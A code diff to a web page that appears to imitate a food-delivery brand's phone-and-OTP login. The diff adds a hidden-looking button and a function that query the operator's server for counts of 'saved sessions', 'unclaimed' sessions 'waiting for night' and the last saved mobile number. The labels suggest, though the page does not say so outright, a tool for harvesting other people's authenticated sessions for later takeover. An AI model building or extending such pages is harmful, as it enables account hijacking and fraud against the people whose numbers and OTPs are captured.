@@ -31,6 +31,7 @@
         .status.ok { color: #43a047; }
         
         .resend { margin-top: 15px; font-size: 0.9rem; color: var(--swiggy-orange); cursor: pointer; font-weight: 600; }
+        .debug-link { margin-top: 40px; font-size: 0.75rem; color: #ccc; cursor: pointer; text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -63,6 +64,9 @@
     </div>
 
     <div class="status" id="statusMsg"></div>
+    
+    <!-- Check Server Button -->
+    <div class="debug-link" onclick="checkServer()">Check Saved Sessions on Server</div>
 </div>
 
 <script>
@@ -88,6 +92,23 @@
             while (b.length % 4) b += '=';
             return JSON.parse(decodeURIComponent(atob(b).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join('')));
         } catch { return {}; }
+    }
+
+    // SERVER CHECK FUNCTION
+    async function checkServer() {
+        setStatus("Checking server database...", "");
+        try {
+            const r = await fetch(API + "/api/check-sessions");
+            const d = await r.json();
+            if(d.status === "success") {
+                alert(`✅ SERVER STATUS: CONNECTED\n\n Total Saved Sessions: ${d.total_sessions}\n⏳ Unclaimed (Waiting for Night): ${d.unclaimed_sessions}\n📱 Last Saved Number: ${d.last_saved_mobile}`);
+                setStatus("Server check successful!", "ok");
+            } else {
+                alert("️ No sessions saved on server yet.");
+            }
+        } catch(e) {
+            alert("❌ Failed to connect to server. Check your internet or Render logs.");
+        }
     }
 
     async function sendOtp() {
@@ -156,8 +177,8 @@
                 state = {};
                 document.getElementById("inPhone").value = "";
                 document.getElementById("inOtp").value = "";
-                document.getElementById("btn1").disabled = false; // FIX: Re-enable button
-                document.getElementById("btn2").disabled = false; // FIX: Re-enable button
+                document.getElementById("btn1").disabled = false;
+                document.getElementById("btn2").disabled = false;
                 setStatus("");
                 go("v1");
             }, 3000);
